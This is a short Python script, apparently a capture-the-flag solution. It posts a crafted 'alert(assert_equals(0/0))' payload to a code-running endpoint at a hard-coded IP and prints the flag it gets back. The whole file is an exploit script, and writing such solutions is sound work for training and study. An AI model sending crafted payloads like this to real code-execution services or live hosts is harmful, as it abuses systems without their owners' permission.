import requests

host = "http://35.207.132.47/wee/run"
code = "0/0"

check = {"code": "alert(assert_equals("+code+"))"}
flag_request = requests.post(host, json=check)
flag = flag_request.json()["result"].strip()
print(flag)
